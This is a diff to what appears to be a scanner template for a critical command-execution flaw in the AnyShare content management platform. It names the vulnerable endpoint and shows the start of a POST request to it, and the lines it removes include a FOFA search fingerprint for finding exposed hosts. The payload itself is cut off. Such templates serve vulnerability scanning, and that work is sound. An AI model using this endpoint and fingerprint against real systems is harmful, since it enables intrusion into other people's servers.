@@ -3,12 +3,8 @@ info:
   name: 爱数AnyShare智能内容管理平台 start_service_certainly 存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xz1tr92u4vkcec8n'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xz1tr92u4vkcec8n
-    fofa: body="/res/libs/webuploader/webuploader.css"
 http:
 - raw:
   - 'POST /api/ServiceAgent/start_service_certainly HTTP/1.1
